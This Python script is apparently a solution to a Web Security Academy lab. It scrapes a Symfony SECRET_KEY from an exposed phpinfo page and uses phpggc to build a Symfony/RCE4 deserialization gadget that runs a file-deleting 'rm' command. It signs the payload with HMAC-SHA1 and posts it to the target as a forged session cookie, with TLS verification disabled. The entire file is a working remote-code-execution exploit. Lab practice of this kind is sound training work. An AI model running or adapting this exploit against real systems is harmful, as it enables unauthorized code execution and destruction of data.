import subprocess
import urllib.parse
import requests
from bs4 import BeautifulSoup
import hmac
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# Get Secret_Key

url_phpinfo = "https://0afc00cd044722c0c0ae088a0033009b.web-security-academy.net/cgi-bin/phpinfo.php"
r_phpinfo = requests.get(url_phpinfo, verify=False)

soup = BeautifulSoup(r_phpinfo.content, "html5lib")

data = []
tables = soup.findAll('table')
for table in tables:
    table_body = table.find('tbody')
    rows = table_body.find_all('tr')
    for row in rows:
        cols = row.find_all('td')
        cols = [ele.text.strip() for ele in cols]
        if "SECRET_KEY" in cols:
            data.append([ele for ele in cols if ele][1])

Secret_Key = data[0]

# Genrate the payload 
# you should Download phpggc with (sudo apt install phpgcc) or github (https://github.com/ambionics/phpggc)

payload = subprocess.getoutput("phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0")

# Generate hmac

hmac3 = hmac.new(key=Secret_Key.encode(), digestmod="sha1")
hmac3.update(bytes(payload, encoding="utf-8"))
message_digest3 = hmac3.hexdigest()

# Generating final payload
final_payload = '{"token":"' + payload + '","sig_hmac_sha1":"' + message_digest3 + '"}'
serial_url_encode = urllib.parse.quote_plus(final_payload)
headers = {"cookie": "session="+serial_url_encode}

#exploit

r = requests.post("https://0afc00cd044722c0c0ae088a0033009b.web-security-academy.net/", headers=headers, allow_redirects=False, verify=False)
